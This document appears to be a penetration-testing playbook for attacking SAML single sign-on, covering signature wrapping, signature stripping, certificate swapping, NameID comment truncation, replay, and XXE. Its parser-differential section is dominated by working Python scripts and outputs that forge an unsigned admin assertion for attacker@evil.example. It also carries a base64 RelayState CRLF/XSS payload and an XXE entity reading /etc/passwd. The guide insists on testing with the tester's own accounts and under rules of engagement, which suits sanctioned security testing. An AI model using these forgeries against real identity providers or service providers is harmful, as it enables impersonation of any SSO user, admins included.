# SAML XSW, Signature Stripping & Assertion Confusion

## Contents
- A — XML Signature Wrapping (XSW1-8)
- B — Signature stripping / exclusion
- C — Certificate / issuer confusion
- D — Comment-truncation `NameID` injection (CVE-2017-11427 class)
- E — Replay, audience & recipient confusion
- F — XXE / SSRF in the SAML parser
- G — Parser differentials (two parsers, one signature check)
- Good evidence
- Ladder discipline

Use when the flow carries a `SAMLResponse`/`SAMLRequest` (base64, often deflated),
a `<saml:Assertion>`, or the SP is ADFS/Okta/OneLogin/Shibboleth. The finding is
**authenticating as a different subject** (usually an admin) by making the SP
trust an assertion whose signature it never actually validated over the forged
content. Prove with your **own** two identities (yours -> your second admin/test
account), on UAT if RoE restricts it.

> **Tooling:** SAMLRaider is a Burp GUI extension — unusable headless. Do the XSW transforms by hand with `python3` + `lxml`, or with `xmlsec1`; the assertion surgery in this file is the actual method, the tool is not.

`lxml` is installed (`python3 -c "import lxml"`); `xmlsec1` is not
(`sudo apt install -y xmlsec1` if you need re-signing). Decode and re-encode the
assertion with the `base64`/`zlib` snippet below, mutate the tree in `lxml`, then
resubmit — that is the whole loop.

```bash
# decode a SAMLResponse (URL-decode first if from a redirect binding)
python3 - <<'PY'
import base64,zlib,sys,urllib.parse
r=urllib.parse.unquote(open('samlresp.txt').read().strip())
raw=base64.b64decode(r)
try: raw=zlib.decompress(raw,-15)   # redirect binding is deflated
except Exception: pass              # POST binding is not
print(raw.decode())
PY
```

Read the assertion: where is `<ds:Signature>` (wraps `Response` or `Assertion`?),
what does it `Reference URI="#..."` point at, and where are `NameID`,
`AttributeStatement` (roles/groups/email), `Audience`, `SubjectConfirmationData`
(`Recipient`, `NotOnOrAfter`)?

## A — XML Signature Wrapping (XSW1-8)

The processor validates the signature against the *original signed element* but
then **reads a different, unsigned element** you inject. Add a second
`Assertion`/`Response` with your forged `NameID`/attributes and arrange the tree
so the signature still references the untouched original while the SP consumes
your forgery. The eight canonical placements — apply each by hand with `lxml`
(clone the element, re-`ID` it, re-parent it), one per request:

- **XSW1/2** — wrap the *Response* signature: clone the Response, keep the
  original signed one as a child/sibling of the forged one, give the forged one a
  new `ID`.
- **XSW3/4** — inject a forged **Assertion** as a sibling/child of the original
  signed Assertion; SP validates the original, processes the forged.
- **XSW5/6** — move the signature into the forged assertion or reorder so the
  reference resolves to the original but evaluation picks the forged.
- **XSW7/8** — hide the original signed assertion inside an `Extensions` /
  `Object` wrapper (or a second `Object`), leaving the forged one as the visible
  top assertion.

For each: set the forged `NameID` to your second admin/test identity's subject
(email/UPN) and re-`Audience`/`Recipient` to the SP. Success = the SP logs you in
as that subject. This is the highest-impact SAML bug — impersonate any subject
including admins.

If all eight placements are rejected but the SP still glues a signature checker
onto a *separate* traversal API, the wrapping is not the problem — go to §G,
which needs no wrapping at all.

## B — Signature stripping / exclusion

- **Remove `<ds:Signature>` entirely** — some SPs "validate" only when a signature
  is present and accept an unsigned assertion. Strip it, forge `NameID`, submit.
- **Strip the assertion signature but keep a response signature** (or vice-versa)
  when the SP checks only one level.
- **Empty/invalid signature accepted** — replace the `SignatureValue` with garbage;
  if login still succeeds, the SP isn't verifying (equivalent to JWT sig-not-checked).

## C — Certificate / issuer confusion

- **Self-signed cert swap** — re-sign the whole assertion with **your own** cert
  and swap the embedded `<ds:X509Certificate>`. If the SP trusts the embedded cert
  instead of a pinned IdP cert, your forged assertion validates cleanly. Generate
  the cert with `openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out
  c.pem -subj "/CN=<IdP entityID>"`, re-sign with `xmlsec1 --sign --privkey-pem
  k.pem,c.pem`, and base64 the result back into `SAMLResponse`. This is the
  offline analogue of JWT `x5c` injection.
- **`Issuer` not pinned** — an assertion from a *different* IdP/tenant is accepted
  (multi-tenant SP confusion); present one from your own tenant to another's SP.

## D — Comment-truncation `NameID` injection (CVE-2017-11427 class)

Canonicalization/XML-comment handling bugs let a comment split a `NameID` so the
signature covers the whole string but the SP reads only the part before the
comment (OneLogin python-saml 2.3.0 and earlier CVE-2017-11427, OneLogin ruby-saml
1.6.0 and earlier CVE-2017-11428, Clever saml2-js 2.0 and earlier CVE-2017-11429,
OmniAuth-SAML 1.9.0 and earlier CVE-2017-11430, Duo Network Gateway 1.2.9 and
earlier CVE-2018-7340, Shibboleth). If you can register/control
`admin@target.com.evil.com` (or add a comment), craft:

```xml
<saml:NameID>admin@target.com<!---->.evil.com</saml:NameID>
<!-- or -->
<saml:NameID>admin@target.com<!--x-->extra</saml:NameID>
```

Signature validates over the full node; the vulnerable parser resolves the
`NameID` to `admin@target.com` -> you log in as admin using an account you own
that merely *contains* the target string. Prove with an identity you control.

## E — Replay, audience & recipient confusion

- **Replay** — resubmit a captured (own) `SAMLResponse` after its first use; if the
  SP has no one-time / `NotOnOrAfter` / `InResponseTo` check, it re-authenticates.
- **Audience/Recipient not checked** — an assertion minted for SP-A is accepted by
  SP-B (`Audience`/`Recipient` ignored) — cross-SP token reuse.
- **IdP-initiated to arbitrary SP / `RelayState` open redirect** — the
  IdP-initiated flow forwards to a `RelayState` URL without allowlist -> chain to
  token/code theft on another host.
- **`RelayState` as a CRLF / response-splitting sink — the higher-value half.** The
  same parameter is written straight into the `Location:` header of the redirect that
  ends the flow. If CR/LF survive, you terminate the header block early and own the
  response body **in the SP's origin**:

  ```
  RelayState = base64( "\r\nContent-Type: text/html\r\n\r\n<script>alert(document.domain)</script>" )
  ```

  Two reasons this gets missed. `RelayState` is commonly **base64** (and often
  URL-encoded on top), so a filter looking for literal `%0d%0a` never matches, and so
  does a reviewer skimming the request. And it is carried by *logout* endpoints
  (`/cgi/logout`, `/saml/sls`, `/SLO`) as much as login ones — the logout leg is
  rarely tested and often needs no valid assertion, since the parameter is echoed
  before the `SAMLResponse` is validated.

  **Security headers declared by the real response do not protect the split one.**
  Your injected `\r\n\r\n` ends the header section, so the CSP, `X-Content-Type-Options`
  and everything after it arrive as body text rather than as headers. Do not conclude
  a strict CSP in the observed response means the payload cannot fire — check where
  the split lands relative to it.

  Test it with `curl -D -` and read the **raw** response: the finding is visible as a
  second `Content-Type` and your payload sitting in what should still be the header
  block. Appliance SAML gateways are a recurring home for this (Citrix NetScaler's
  `/cgi/logout` carries CVE-2025-12101); confirm the appliance's version against the
  vendor advisory before claiming the CVE, and report the reflected execution either
  way — that is proven, the version match is not.

  **Corpus case:** `4cf15b69523d497cb0b6d2f8d0371bf7` —
  `bugcrowd/reports/4cf15b69523d497cb0b6d2f8d0371bf7-reflected-xss-via-crlf-injection-in-citrix-netscaler-sa.md`
  (P4 · duplicate; base64 `RelayState` on `/cgi/logout`, response split visible in the
  raw headers).

## F — XXE / SSRF in the SAML parser

The `SAMLResponse` is XML you control before signature checks in some stacks:

- classic XXE: `<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]>` with `&e;`
  in a text node -> file read / SSRF (hand to `ssrf-safe`/`rce-hunting`);
- billion-laughs / parameter entities for OOB exfil to your listener;
- the IdP metadata / `jku`-like `AssertionConsumerServiceURL` or a metadata URL
  the SP fetches is an SSRF sink.

## G — Parser differentials (two parsers, one signature check)

§A moves elements so that one parser validates node X and consumes node Y. A
parser differential needs no wrapping at all: the SP runs **two different XML
implementations** over the same bytes — one to check the signature, one to read
the identity — and the two disagree about what the document contains. The IdP's
signature stays byte-valid and verifies; the subject the SP acts on is the one
you chose. §D is one parser mis-reading the *text* of a node it correctly
located; this is two parsers that never agreed on which node it was.

ruby-saml states the split in its own source (`lib/xml_security.rb`, v1.18.1):
`class BaseDocument < REXML::Document` for every traversal, and
`Nokogiri::XML(doc_str)` whose `.canonicalize` produces the bytes that get hashed
and signature-checked. The `Reference URI`, the `DigestValue`, the
`X509Certificate` and the `NameID` are all located with `REXML::XPath`, while the
digest and `SignedInfo` come from libxml2. Every question of the form "which
element is `#_signed`?" therefore has two answers. Stacks that parse **once**
(Shibboleth/OpenSAML, `xmlsec1` used as the single authority) are the negative
control for the whole class.

### The advisories — each id verified against its GHSA/NVD entry

| CVE | stack | affected | fixed | the disagreement |
|---|---|---|---|---|
| CVE-2025-25291 | ruby-saml | `< 1.12.4`, `1.13.0`–`1.17.x` | 1.12.4 / 1.18.0 | DOCTYPE handling: REXML and Nokogiri build different trees |
| CVE-2025-25292 | ruby-saml | `< 1.12.4`, `1.13.0`–`1.17.x` | 1.12.4 / 1.18.0 | namespace handling, same two parsers |
| CVE-2025-66567 | ruby-saml | `< 1.18.0` | 1.18.0 | incomplete fix for 25292 — REXML keeps `xmlns:*` as ordinary attributes |
| CVE-2025-66568 | ruby-saml | `< 1.18.0` | 1.18.0 | libxml2 canonicalization returns `""` on invalid input; the digest is taken over the empty string |
| CVE-2024-45409 | ruby-saml | `<= 1.12.2`, `1.13.0`–`1.16.0` | 1.12.3 / 1.17.0 | XPath selector resolves the signature outside the intended scope |
| CVE-2025-29774 | `xml-crypto` (node-saml / passport-saml) | `< 2.1.6`, `< 3.2.1`, `< 6.0.1` | 2.1.6 / 3.2.1 / 6.0.1 | more than one `SignedInfo` inside one `Signature` |
| CVE-2025-29775 | `xml-crypto` | same ranges | 2.1.6 / 3.2.1 / 6.0.1 | a comment inside `DigestValue` changes which text the reader takes |
| CVE-2026-34840 | OneUptime | `< 10.0.42` | 10.0.42 | `xml-crypto` verifies the first element, `xml2js` always reads `assertion[0]` |
| CVE-2020-26276 | Fleet | `< 3.5.1` | 3.5.1 | Go `encoding/xml` re-serialises a document differently than it parsed it |
| CVE-2021-21238 | pysaml2 | `< 6.5.0` | 6.5.0 | no schema validation, and `xmlsec1` verifies only the *first* signature in scope |

CVE-2025-66567/66568 were reported by d0ge and written up in PortSwigger's *The
Fragile Lock* (2025-12-10); 25291/25292 are GHSL-2024-329/330, GitHub Security
Lab's *Sign in as anyone*. PortSwigger reports the same empty-canonicalization
bug in php-saml and Rob Richards' `xmlseclibs` — **no CVE id is confirmed for
those two**, so cite the technique there, never a number.

### G1 — Fingerprint the stack before crafting anything

The class is version-gated, so the version *is* the severity. Cheapest signals
first, on your **own** SSO login:

**Break your own assertion on purpose and read the error.** Flip one byte of
`SignatureValue` and resubmit. The ruby-saml strings below are verbatim from
`lib/onelogin/ruby-saml/response.rb` and `lib/xml_security.rb` on master (v1.18.1).

| string surfaced to the browser, JSON body or log | what it tells you |
|---|---|
| `Invalid Signature on SAML Response`, `Digest mismatch`, `Fingerprint mismatch`, `No Signature node found`, `No Reference node found` | ruby-saml, any version |
| `Signed element id #<id> is not found` / `is found more than once` | ruby-saml resolving the `Reference URI` by string match |
| `Duplicated ID. SAML Response rejected` | duplicate-`ID` primitives are already blocked — skip to G3b/G3c |
| `Duplicated Reference URI. SAML Response rejected`, `Found an unexpected number of Signature Element. SAML Response rejected` | multi-`Signature` and multi-`Reference` primitives blocked |
| `Invalid SAML Response. Not match the saml-schema-protocol-2.0.xsd` | schema validation is ON; the pysaml2-class malformed-envelope trick is closed |
| `Certificate of the Signature element does not match provided certificate` | the embedded cert is not trusted — §C is closed, keep to §G |
| `OneLogin::RubySaml::ValidationError` anywhere in a trace | ruby-saml behind Devise / OmniAuth |
| `The response was received at <x> instead of <y>` | python3-saml (`invalid_response`) |

Then the three reads that pin the build:

- **Route shape** is a hint, not a confirmation — treat it as a lead and confirm
  with an error string: `/users/auth/saml/callback` or `/auth/saml/callback`
  (OmniAuth -> ruby-saml); `/login/callback` (passport-saml / node-saml ->
  `xml-crypto`); an ACS URL carrying `?acs` (python3-saml); `/saml2/acs/`
  (pysaml2); `/Shibboleth.sso/SAML2/POST` with a `_shibsession_*` cookie
  (OpenSAML C++ — single parser, expect this class to be closed);
  `/simplesaml/module.php/saml/sp/saml2-acs.php/` (SimpleSAMLphp); `/adfs/ls/`
  (ADFS).
- **Read the SP metadata** (`/saml/metadata`, `/sp/metadata`, `?metadata`): the
  `WantAssertionsSigned` / `AuthnRequestsSigned` flags tell you which layer the
  SP actually checks, which decides whether you forge at Response or Assertion
  level.
- **Pin the exact version if a lockfile is reachable.** `Gemfile.lock` /
  `package-lock.json` via an exposed `.git` (`git-dumper`, see
  `../../_shared/references/tooling.md`) turns "maybe vulnerable" into a version
  inside a published range — that single line is what makes the report land.

### G2 — Inspect the signature without `xmlsec1` (openssl + python3)

`xmlsec1` is **not installed on this host** and you do not need it to *read* a
signature — only to re-sign one. This inspector answers the two questions the
whole class turns on: does the IdP signature verify, and *which element* does it
actually cover? It uses `openssl` for RSA and `lxml` (libxml2 — the same engine
Nokogiri wraps) for exclusive canonicalization.

```bash
cat >/tmp/samlsig.py <<'PY'
"""samlsig.py <saml.xml> - per ds:Signature: Reference URI, RSA verify under the
embedded cert, and whether the referenced element still hashes to DigestValue."""
import base64, hashlib, subprocess, sys, tempfile, os
from lxml import etree as ET
DS = "http://www.w3.org/2000/09/xmldsig#"; NS = {"ds": DS}
doc = ET.parse(sys.argv[1]).getroot()
c14n = lambda el: ET.tostring(el, method="c14n", exclusive=True, with_comments=False)
for i, sig in enumerate(doc.iter("{%s}Signature" % DS)):
    si = sig.find("ds:SignedInfo", NS); ref = si.find("ds:Reference", NS)
    uri = (ref.get("URI") or "").lstrip("#")
    print(f"[sig {i}] parent=<{ET.QName(sig.getparent()).localname}> Reference URI=#{uri}")
    der = base64.b64decode(sig.find(".//ds:X509Certificate", NS).text.strip())
    t = tempfile.mkdtemp(); open(t+"/c.der","wb").write(der)
    o = lambda *a: subprocess.run(["openssl", *a], capture_output=True)
    open(t+"/pub.pem","wb").write(o("x509","-inform","DER","-in",t+"/c.der","-pubkey","-noout").stdout)
    print("        cert", o("x509","-inform","DER","-in",t+"/c.der","-noout","-subject").stdout.decode().strip())
    open(t+"/si","wb").write(c14n(si))
    open(t+"/sv","wb").write(base64.b64decode(sig.find("ds:SignatureValue", NS).text))
    r = o("dgst","-sha256","-verify",t+"/pub.pem","-signature",t+"/sv",t+"/si")
    print("        SignedInfo signature:", (r.stdout or r.stderr).decode().strip())
    tgt = next((e for e in doc.iter() if any(e.get(a) == uri for a in ("ID","Id","id"))), None)
    if tgt is None:
        print("        REFERENCED ELEMENT NOT FOUND -> nothing is actually covered"); continue
    clone = ET.fromstring(ET.tostring(tgt))                 # detached copy
    for s in clone.iter("{%s}Signature" % DS):              # enveloped-signature transform
        s.getparent().remove(s); break
    got = base64.b64encode(hashlib.sha256(c14n(clone)).digest()).decode()
    want = ref.find("ds:DigestValue", NS).text.strip()
    print(f"        digest want={want}\n        digest got ={got}   -> "
          f"{'MATCH' if got == want else 'MISMATCH'}")
    print("        signed element covers NameID="
          f"{[n.text for n in tgt.iter('{urn:oasis:names:tc:SAML:2.0:assertion}NameID')]}")
print("\n[what a naive SP would read] first NameID in document order:",
      next(doc.iter("{urn:oasis:names:tc:SAML:2.0:assertion}NameID")).text)
PY
python3 /tmp/samlsig.py attack.xml
```

Observed, against a lab `SAMLResponse` signed with a locally generated IdP key
(`openssl req -x509 -newkey rsa:2048 -nodes -keyout idp.key -out idp.crt`) and
then doctored per G3a:

```
[sig 0] parent=<Assertion> Reference URI=#_signed
        cert subject=CN = idp.example.com
        SignedInfo signature: Verified OK
        digest want=GBovh/G8lDm0Jwk4O3BwBKN6MViBTXL5vTfBb5/tP+4=
        digest got =GBovh/G8lDm0Jwk4O3BwBKN6MViBTXL5vTfBb5/tP+4=   -> MATCH
        signed element covers NameID=['alice@corp.example']

[what a naive SP would read] first NameID in document order: attacker@evil.example
```

Those last two lines are the differential in one screen: cryptographically the
document is untouched, and the identity a second reader takes is yours.

Two mechanics the inspector proves and you must not get wrong:

- **`exclusive=True` is not optional** when `CanonicalizationMethod` is
  `xml-exc-c14n#`. Re-running the same digest with `exclusive=False` on the same
  assertion gave `RufXN6BsCgzy/+/2Ua0Im7XfIcIi0YlVT4kqcxYtJ+A=` (MISMATCH) purely
  because inclusive c14n drags the ancestor's `xmlns:samlp` declaration into the
  serialisation. A "digest mismatch" from your own tooling is usually this, not
  the target.
- stdlib `xml.etree.ElementTree.canonicalize()` is **C14N 2.0**. It matched
  lxml's exclusive output byte-for-byte here (771 bytes, identical digest) *only*
  because the subtree was detached and re-serialised first, which drops the
  inherited declaration. Use lxml with `method="c14n", exclusive=True`; keep the
  stdlib call as a cross-check, never as the authority.

### G3 — The four crafting primitives

All four keep the IdP-signed element **byte-identical** — you never touch what is
covered by the signature. You only change what a *second* reader sees.

**G3a — decoupled read (document order).** The CVE-2026-34840 shape and the one
to try first: prepend an unsigned assertion carrying your identity, leave the
signed one untouched. The verifier finds the first `ds:Signature` and validates
it correctly; the identity extractor takes `assertion[0]`.

```bash
python3 - <<'PY'
S='urn:oasis:names:tc:SAML:2.0:assertion'
raw=open('valid.xml').read()
forged=(f'<saml:Assertion xmlns:saml="{S}" ID="_evil" Version="2.0">'
        '<saml:Issuer>https://idp.example.com</saml:Issuer>'
        '<saml:Subject><saml:NameID>attacker@evil.example</saml:NameID></saml:Subject>'
        '<saml:AttributeStatement><saml:Attribute Name="role">'
        '<saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute>'
        '</saml:AttributeStatement></saml:Assertion>')
open('attack.xml','w').write(raw.replace('  <saml:Assertion ID="_signed"',
                                         forged+'\n  <saml:Assertion ID="_signed"',1))
PY
```

Also try it *appended* rather than prepended, and nested inside `saml:Advice`,
`samlp:Extensions` or `samlp:StatusDetail` — GitHub's write-up used an extra
`Signature` hidden in `StatusDetail` that only one of the two parsers could see.

**G3b — attribute pollution (`ID` vs `saml:ID`).** One element, two `ID`s; the
two parsers each pick a different one, so the *same* element is simultaneously
"the signed one" and "the attacker's one". Observed on this host with real REXML
3.4.4 (ruby 3.2.3) against real libxml2 2.14.6 (lxml, the Nokogiri engine),
reading `attributes['ID']` on the Ruby side and `.get('ID')` on the libxml2 side:

| assertion attributes (element is `saml:Assertion`) | REXML `attributes['ID']` | libxml2 `get('ID')` |
|---|---|---|
| `saml:ID="_signed" ID="_evil"` | `"_signed"` | `'_evil'` |
| `samlp:ID="_signed"` | `"_signed"` | `None` |
| `samlp:ID="_signed" ID="_evil"` | `nil` | `'_evil'` |
| `ID="_signed" samlp:ID="_evil"` | `nil` | `'_signed'` |

Row 1 is the payload: REXML answers `_signed` because the unprefixed lookup
resolves against the element's **own** prefix (`saml:`), while libxml2 returns
the no-namespace `ID`. Row 2 is the same trick without a collision. Rows 3–4 show
REXML returning `nil` on an ambiguous collision, which is a denial, not a bypass
— do not waste requests on them. Note the XPath forms are stricter than the
attribute API: `//*[@ID='_signed']` matched only the literal `ID` under **both**
engines, so this primitive only fires where the code uses the attribute accessor.

**G3c — DOCTYPE-driven ID-ness and entity expansion.** `Reference URI="#x"` is
resolved by some code with a string XPath (`//*[@ID='x']`) and by other code with
DOM `getElementById` / XPath `id('x')` — and `id()` only matches attributes
*declared* type `ID`. A crafted internal subset declares that type on an
attribute of your choosing:

```xml
<!DOCTYPE samlp:Response [<!ATTLIST saml:Assertion evilID ID #IMPLIED>]>
<samlp:Response ...>
  <saml:Assertion evilID="_signed"><saml:Subject>
    <saml:NameID>attacker@evil.example</saml:NameID></saml:Subject></saml:Assertion>
  <saml:Assertion ID="_signed">...IdP-signed, untouched...</saml:Assertion>
</samlp:Response>
```

Observed on this host, same document, same identifier:

```
libxml2  id('_signed')        -> [({'evilID': '_signed'}, 'attacker@evil.example')]
libxml2  //*[@ID='_signed']   -> [({'ID': '_signed'}, 'alice@corp.example')]
REXML    //*[@ID="_signed"]   -> [[{"ID"=>"_signed"}, "alice@corp.example"]]
```

The text-level variant is the same DOCTYPE lever on entity policy: put
`<!ENTITY who "attacker@evil.example">` in the internal subset and `&who;` in the
`NameID`. REXML expands it (`NameID.text == "attacker@evil.example"`); libxml2
with entity resolution **off**, which is Nokogiri's default, leaves an entity
node and `NameID.text is None`. ruby-saml pins `REXML::Document::entity_expansion_limit = 0`
in `xml_security.rb`, so on a current build expect this half to be closed and the
ID-ness half to still be worth a request.

**G3d — void canonicalization (detector, not a payload).** CVE-2025-66568: when
libxml2 canonicalization fails, the vulnerable path returns `""` and the digest
is computed over nothing. The tell is a constant — the base64 SHA-256 of the
empty string, verified locally with `echo -n "" | openssl dgst -sha256 -binary | base64`:

```
47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=
```

Any `DigestValue` equal to that means canonicalization returned an empty string
and the reference covers nothing. The trigger is XML that libxml2 refuses to
canonicalize; the published one is a **relative** namespace URI, and
`<a xmlns:r="relative/uri"><r:b>x</r:b></a>` through exclusive c14n on this host
raises `lxml.etree.C14NError: C14N failed` rather than returning `""` — that
difference between raising and swallowing is the whole bug. If the
SP ever echoes a computed digest, or you find that constant in a captured
assertion, you have the bug without crafting anything.

### G4 — Prove the differential locally before you touch the target

Same discipline as the session harness: calibrate against an app whose behaviour
you know, then point the identical bytes at the SP. `MODE=vuln` is the two-parser
build (libxml2 verifies, expat reads), `MODE=vuln-id` is the single-engine
`id()`-lookup build for G3c, `MODE=safe` is the control that parses once and
reads the identity from the element the signature actually covers.

```bash
cat >/tmp/sp.py <<'PY'
"""sp.py <saml.xml> - local two-parser SAML SP. MODE=vuln|vuln-id|safe"""
import base64, hashlib, os, subprocess, sys, tempfile
import xml.etree.ElementTree as EX          # expat   - parser B
from lxml import etree as ET                # libxml2 - parser A
DS = "http://www.w3.org/2000/09/xmldsig#"; SAML = "urn:oasis:names:tc:SAML:2.0:assertion"
MODE = os.environ.get("MODE", "vuln"); raw = open(sys.argv[1], "rb").read()
c14n = lambda el: ET.tostring(el, method="c14n", exclusive=True, with_comments=False)
doc = ET.fromstring(raw)
sig = next(doc.iter("{%s}Signature" % DS), None)
if sig is None: print("REJECT: no signature"); sys.exit(1)
ref = sig.find(".//{%s}Reference" % DS); uri = (ref.get("URI") or "").lstrip("#")
t = tempfile.mkdtemp()
open(t+"/c.der","wb").write(base64.b64decode(sig.find(".//{%s}X509Certificate" % DS).text))
open(t+"/pub.pem","wb").write(subprocess.run(["openssl","x509","-inform","DER","-in",
    t+"/c.der","-pubkey","-noout"], capture_output=True, check=True).stdout)
open(t+"/si","wb").write(c14n(sig.find("{%s}SignedInfo" % DS)))
open(t+"/sv","wb").write(base64.b64decode(sig.find("{%s}SignatureValue" % DS).text))
if subprocess.run(["openssl","dgst","-sha256","-verify",t+"/pub.pem","-signature",
                   t+"/sv",t+"/si"], capture_output=True).returncode:
    print("REJECT: SignedInfo signature invalid"); sys.exit(1)
signed = next((e for e in doc.iter() if e.get("ID") == uri), None)
if signed is None: print("REJECT: Reference target missing"); sys.exit(1)
clone = ET.fromstring(ET.tostring(signed))
for s in clone.iter("{%s}Signature" % DS): s.getparent().remove(s); break
if base64.b64encode(hashlib.sha256(c14n(clone)).digest()).decode() != \
        ref.find("{%s}DigestValue" % DS).text.strip():
    print("REJECT: digest mismatch"); sys.exit(1)
print(f"  [A libxml2] signature OK, covers element ID={uri!r}")
if MODE == "vuln-id":                                # same engine, id() lookup
    hit = doc.xpath("id($u)", u=uri)
    who = hit[0].find(".//{%s}NameID" % SAML).text if hit else None
    print(f"  [A libxml2] id({uri!r}) -> attrs={dict(hit[0].attrib) if hit else None} NameID={who!r}")
elif MODE == "vuln":                                 # parser B, decoupled read
    b = EX.fromstring(raw)
    a = b.find(".//{%s}Assertion" % SAML) if b.tag != "{%s}Assertion" % SAML else b
    who = a.find(".//{%s}NameID" % SAML).text
    print(f"  [B expat  ] read Assertion[0] -> NameID={who!r}")
else:                                                # one document, signed element only
    who = signed.find(".//{%s}NameID" % SAML).text
    print(f"  [A libxml2] read NameID from the SIGNED element -> {who!r}")
print(f"AUTHENTICATED AS: {who}")
PY
for f in valid.xml attack.xml attack2.xml nc1-badsig.xml; do for m in vuln vuln-id safe; do
  printf '%-16s MODE=%-8s ' "$f" "$m"; MODE=$m python3 /tmp/sp.py $f 2>&1 | tail -1; done; done
```

Observed (`attack.xml` = G3a, `attack2.xml` = G3c ATTLIST, `nc1-badsig.xml` =
`attack.xml` with two bytes prepended to `SignatureValue`):

```
valid.xml        MODE=vuln     AUTHENTICATED AS: alice@corp.example
valid.xml        MODE=vuln-id  AUTHENTICATED AS: None
valid.xml        MODE=safe     AUTHENTICATED AS: alice@corp.example
attack.xml       MODE=vuln     AUTHENTICATED AS: attacker@evil.example
attack.xml       MODE=vuln-id  AUTHENTICATED AS: None
attack.xml       MODE=safe     AUTHENTICATED AS: alice@corp.example
attack2.xml      MODE=vuln     AUTHENTICATED AS: attacker@evil.example
attack2.xml      MODE=vuln-id  AUTHENTICATED AS: attacker@evil.example
attack2.xml      MODE=safe     AUTHENTICATED AS: alice@corp.example
nc1-badsig.xml   MODE=vuln     REJECT: SignedInfo signature invalid
nc1-badsig.xml   MODE=vuln-id  REJECT: SignedInfo signature invalid
nc1-badsig.xml   MODE=safe     REJECT: SignedInfo signature invalid
```

Read it down the modes: the signature verifies in every non-`nc1` row, `safe`
always lands on `alice`, and each doctored document flips the identity in exactly
the build whose lookup it targets. If your lab does not reproduce that, your
crafting is wrong and any target result is noise.

**Oracle.** The IdP-signed assertion is accepted — `samlsig.py` prints
`SignedInfo signature: Verified OK` and `digest ... MATCH` over an element whose
`NameID` is **yours** — while the identity the SP acts on is the attacker-chosen
one. On the target that means: the ACS returns a session, and the canonical
authenticated read (`/api/me`, `/whoami`, the account header) names the forged
subject, not the subject the signature covers. Nothing else counts — a 302 to the
dashboard, a "login successful" flash, or a changed UI name is §A's weak oracle
and is not the proof.

**Negative control, and you must ship it.** The same document with two bytes
prepended to `SignatureValue` is rejected (`REJECT: SignedInfo signature invalid`
locally; a signature error on the target). That is what separates "the SP
validates signatures and my specific differential slipped past" from "this SP
never validated anything" — the latter is §B's finding, simpler and at least as
strong, and it belongs in that report, not this one.

**Rung.** Rung 2 throughout. The forged `NameID` must be your **own** second
test/admin subject, or a UAT test admin (rung 4) where RoE restricts
impersonation. Never point it at a real employee's SSO identity on prod — that is
rung 5 and it is never necessary, because logging in as your own second subject
through a signature that only covers your first proves the class completely. The
IdP-signed assertion you doctor must be one **you** captured from **your own**
login; replaying a captured third-party assertion is rung 5 regardless of what
you do to it.

**Converts?** **Critical** when the ACS accepts it and the resulting session is a
different subject — impersonation of any SSO identity in the tenant, admins
included, CWE-347. The published instances sit at 8.1–9.3 (CVSS v4 9.3 for the
ruby-saml set, CVSS v3.1 8.1 for OneUptime). Two things deflate it, so handle
both in the draft: (1) the class requires **one** valid IdP-signed document, so
say plainly that you used your own login's assertion and that any low-privilege
SSO user of the tenant has the same starting material — otherwise a triager reads
"attacker needs a valid signature" as "attacker needs the IdP key" and downgrades
it; (2) a version match alone is **informative**, not a finding — programs close
"you run ruby-saml 1.17.0" as a dependency report unless the doctored response
actually authenticated. Reaching the version banner and stopping is rung 0. If
the SP rejects every primitive, that is a real negative: write the one-line
dead-end note (`ruby-saml, schema validation on, duplicate-ID + duplicate-URI
guards present, G3a/b/c all rejected`) and rotate to §E or to the IdP side.

## Good evidence

- a wrapped/stripped/cloned-cert/comment-truncated `SAMLResponse` that logs you in
  as your **second** (admin/test) subject — captured request + the resulting
  authenticated session/`/me`;
- a negative control: the *unmodified valid* assertion is required for the normal
  flow, and a trivially-tampered one (bad SignatureValue, no wrapper) is rejected
  — proving the SP normally enforces and your specific wrapping bypassed it;
- for a parser differential (§G): `samlsig.py` output showing
  `SignedInfo signature: Verified OK` + `digest ... MATCH` over an element whose
  `NameID` is your own subject, next to the SP's authenticated read naming the
  forged subject — plus the pinned library version and the CVE range it falls in;
- for XXE: your OOB listener hit / a non-sensitive file read.

## Ladder discipline

Own IdP identities / test SP accounts only. The "victim admin" subject you
impersonate must be an account you control or a UAT test admin — never a real
employee's SSO identity on prod (that's rung 5 — not attempted: d0x's approval before execution). Do not replay a real
user's captured assertion. Flag any cloned cert / minted assertion for rotation in
the lead file under `targets/<program>/leads/`
(`../../_shared/references/output-contract.md`).
